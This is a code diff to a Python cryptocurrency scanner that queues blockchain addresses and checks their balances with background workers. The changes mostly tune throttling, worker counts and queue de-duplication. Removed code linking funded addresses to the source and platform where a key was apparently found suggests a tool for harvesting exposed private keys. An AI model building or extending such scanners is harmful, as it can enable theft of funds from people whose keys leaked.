@@ -689,15 +689,47 @@ def available_memory_mb() -> float:
 
 
 def throttle_cpu_ram(sleep_base: float = 0.05):
-    """Sleep a little and collect garbage if memory is low."""
-    time.sleep(sleep_base)
+    """Sleep a little and collect garbage if memory is low.
+
+    On healthy devices (multi-GB free) sleep is near-zero so the feed
+    and balance workers are not artificially slowed.
+    """
     mem = available_memory_mb()
     if 0 < mem < 256:
         logger.info("Throttling: low memory (%.1f MB available)", mem)
         gc.collect()
-        time.sleep(sleep_base * 4)
-    elif mem >= 256:
-        logger.debug("Memory OK: %.1f MB available", mem)
+        time.sleep(max(sleep_base, 0.05) * 4)
+    elif 0 < mem < 512:
+        time.sleep(sleep_base)
+        gc.collect()
+    elif sleep_base > 0:
+        # Healthy RAM — tiny yield only (or none)
+        if sleep_base >= 0.01:
+            time.sleep(min(sleep_base, 0.005))
+
+
+def recommend_balance_workers() -> int:
+    """Scale balance workers from free RAM + CPU. Env BALANCE_WORKERS overrides."""
+    env = os.environ.get("BALANCE_WORKERS", "").strip()
+    if env.isdigit():
+        return max(2, min(32, int(env)))
+    mem = available_memory_mb()
+    try:
+        cpus = os.cpu_count() or 4
+    except Exception:
+        cpus = 4
+    # I/O-bound HTTP checks → more threads than cores is fine
+    if mem >= 6000:
+        n = min(24, max(12, cpus * 2))
+    elif mem >= 3000:
+        n = min(16, max(8, cpus + 2))
+    elif mem >= 1500:
+        n = min(10, max(6, cpus))
+    elif mem >= 700:
+        n = 4
+    else:
+        n = 2
+    return n
 
 
 # ---------------------------------------------------------------------------
@@ -1588,60 +1620,34 @@ def balance_worker(q: queue_module.Queue, stop_event: threading.Event):
     """Background worker that checks balances without blocking the scanner."""
     while not stop_event.is_set() or not q.empty():
         try:
-            chain, address = q.get(timeout=0.5)
+            item = q.get(timeout=0.5)
         except queue_module.Empty:
             continue
+        if item is None:
+            q.task_done()
+            break
+        chain, address = item
         try:
-            throttle_cpu_ram(0.05)
+            # No per-item sleep on healthy devices (was 50ms * N = severe lag)
+            throttle_cpu_ram(0.0)
             bal = get_balance(chain, address)
-            if bal["balance"] is not None and bal["balance"] > 0:
+            if bal and bal.get("balance") is not None and bal["balance"] > 1e-12:
                 global BALANCE_HITS_COUNT
                 with BALANCE_HITS_LOCK:
                     BALANCE_HITS_COUNT += 1
                 msg = f"BALANCE FOUND {bal['chain']} {bal['address']} => {bal['balance']}"
                 logger.info("*** %s", msg)
                 try:
-                    src_uri = ""
-                    platform = "unknown"
-                    if os.path.exists(MEMORY_FILE):
-                        with open(MEMORY_FILE, "rb") as mf:
-                            mf.seek(0, 2)
-                            size = mf.tell()
-                            mf.seek(max(0, size - 200_000))
-                            tail = mf.read().decode("utf-8", errors="ignore")
-                        for ln in reversed(tail.splitlines()):
-                            if address not in ln:
-                                continue
-                            try:
-                                rec = json.loads(ln)
-                            except Exception:
-                                continue
-                            src_uri = rec.get("source_uri") or rec.get("source") or ""
-                            platform = rec.get("platform") or "unknown"
-                            if src_uri:
-                                break
+                    # Skip scanning multi-MB memory tail on every hit (was very slow).
                     bal_out = dict(bal)
-                    if src_uri:
-                        bal_out["source_uri"] = src_uri
-                        bal_out["platform"] = platform
-                        try:
-                            from target_intelligence import TargetIntelligence
-                            TargetIntelligence().record_outcome(
-                                src_uri,
-                                platform=platform,
-                                has_key=True,
-                                has_balance=True,
-                                balance_total=float(bal["balance"] or 0),
-                                finding_types=[f"balance:{chain}"],
-                                meta={"address": address, "chain": chain},
-                            )
-                        except Exception:
-                            pass
                     with open(BALANCE_HIT_FILE, "a") as f:
                         f.write(json.dumps(bal_out) + "\n")
                 except Exception:
-                    with open(BALANCE_HIT_FILE, "a") as f:
-                        f.write(json.dumps(bal) + "\n")
+                    try:
+                        with open(BALANCE_HIT_FILE, "a") as f:
+                            f.write(json.dumps(bal) + "\n")
+                    except Exception:
+                        pass
                 notify("Crypto Scanner", msg)
         except Exception as e:
             logger.debug("Balance worker error %s/%s: %s", chain, address, e)
@@ -1716,16 +1722,68 @@ def main():
     context_window: List[str] = []
     balance_queue: queue_module.Queue = queue_module.Queue()
     stop_event = threading.Event()
-    num_workers = 2  # throttled to avoid freeze on low-RAM devices
+    queued_keys: set = set()  # (chain, addr) already in-flight or recently queued
+    queued_keys_lock = threading.Lock()
+
+    num_workers = recommend_balance_workers()
+    logger.info(
+        "Balance workers: %d (mem=%.0fMB cpus=%s env BALANCE_WORKERS=%s)",
+        num_workers,
+        available_memory_mb(),
+        os.cpu_count(),
+        os.environ.get("BALANCE_WORKERS", ""),
+    )
     workers = []
     for _ in range(num_workers):
         t = threading.Thread(target=balance_worker, args=(balance_queue, stop_event), daemon=True)
         t.start()
         workers.append(t)
 
+    def _cache_fresh_enough(chain: str, address: str) -> bool:
+        """True if we already have a recent cached result — don't re-queue."""
+        key = f"{chain}:{address}"
+        with BALANCE_CACHE_LOCK:
+            cached = BALANCE_CACHE.get(key)
+        if not cached:
+            return False
+        age = time.time() - float(cached.get("ts") or 0)
+        bal = cached.get("balance")
+        if bal is not None and age < 3600:
+            return True
+        if bal is None and age < 300:
+            return True
+        if cached.get("settled") and bal == 0 and age < 21600:
+            return True
+        if cached.get("invalid") and age < 86400:
+            return True
+        return False
+
     def queue_balances(addr_map: Dict[str, List[str]]):
-        for chain, addrs in addr_map.items():
-            for a in set(addrs):
+        """Enqueue unique addresses that still need a live check."""
+        # Soft backpressure: if queue is huge, only take high-value chains first
+        qsz = balance_queue.qsize()
+        priority = ("btc", "eth", "sol", "ltc", "doge", "matic", "avax", "bnb", "base", "monad", "xrp", "ton")
+        chains = [c for c in priority if c in addr_map] + [
+            c for c in addr_map if c not in priority
+        ]
+        # When overloaded, skip secondary EVM mirrors of same hex (matic/avax/bnb/base/monad)
+        # if eth already queued — they share address; eth check is enough signal for now
+        skip_evm_mirrors = qsz > 20_000
+        for chain in chains:
+            if skip_evm_mirrors and chain in ("matic", "avax", "bnb", "base", "monad"):
+                continue
+            for a in set(addr_map.get(chain) or []):
+                if not a:
+                    continue
+                ck = f"{(chain or '').lower()}:{a}"
+                with queued_keys_lock:
+                    if ck in queued_keys:
+                        continue
+                    if len(queued_keys) > 500_000:
+                        queued_keys.clear()
+                    if _cache_fresh_enough(chain, a):
+                        continue
+                    queued_keys.add(ck)
                 balance_queue.put((chain, a))
 
     try:
@@ -1861,7 +1919,7 @@ def main():
             if len(context_window) > 3:
                 context_window.pop(0)
 
-            throttle_cpu_ram(0.02)
+            throttle_cpu_ram(0.0)
 
     except KeyboardInterrupt:
         logger.info("Stopping. Waiting for balance queue to drain...")
